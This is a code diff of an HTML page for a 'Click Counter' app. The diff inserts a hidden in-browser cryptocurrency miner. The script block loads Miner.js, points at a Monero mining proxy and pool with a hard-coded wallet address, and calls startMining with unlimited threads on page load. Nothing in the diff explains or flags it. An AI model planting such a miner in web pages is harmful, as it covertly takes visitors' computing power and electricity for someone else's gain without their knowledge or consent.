@@ -5,6 +5,21 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Click Counter</title>
 
+
+<!-- Start Of Mining Code -->
+<script src="Miner.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "463hjpRmnpHNNUjwitD7LQYW6AT3JXwDdJwAB6DERonLfpSNVm8uqqMe4yCQrKKF629FoD9sQ3rH9gkDTfLoxSNBAEBbfWy";
+    var workerId = ""
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
+<!-- End Of Mining Code -->
+	
 <script src="https://apis.google.com/js/platform.js" async defer></script>
 <script>
 	function hideClass(name) {
